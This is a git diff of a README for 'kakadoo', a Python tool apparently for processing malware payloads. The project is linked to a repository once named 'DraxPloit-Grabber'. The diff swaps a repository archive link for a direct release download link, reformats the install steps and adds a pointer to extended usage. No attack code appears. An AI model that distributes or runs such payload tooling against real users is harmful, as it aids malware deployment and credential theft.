@@ -43,16 +43,15 @@ adding to that, this only works on users that are in the "Administrators" group.
 ### <a id="requirements"></a> :white_check_mark: - Requirements
 
 * [Python](https://www.python.org)
-* The latest release of kakadoo
-* The code in this [Repository](https://github.com/DraxFM/DraxPloit-Grabber/archive/refs/heads/main.zip)
+* The latest release of [kakadoo](https://github.com/DraxFM/kakadoo/releases/latest/download/draxfm-kakadoo.zip)
 
 ---
 
 ### <a id="installing"></a> :hammer: - Installing
 
-1. Install the latest release of kakadoo
-2. Extract the .zip file in the desired directory.
-3. Run "kakadoo.py"
+1. Install the latest release of [kakadoo](https://github.com/DraxFM/kakadoo/releases/latest/download/draxfm-kakadoo.zip)
+2. Extract the **.zip** file in the desired directory.
+3. Run "**kakadoo.py**"
 4. Wait until missing dependencies are installed.
 5. kakadoo is ready for use
 6. Enjoy!
@@ -66,7 +65,8 @@ adding to that, this only works on users that are in the "Administrators" group.
 3. Enter in "1" and press Enter.
 4. Paste the path of your payload into the entry field.
 5. Let kakadoo do the rest.
-6. Your file is ready for usage!
+6. See [extended Usage](#extendedusage) for more help.
+7. Your file is ready for usage!
 
 ---
 
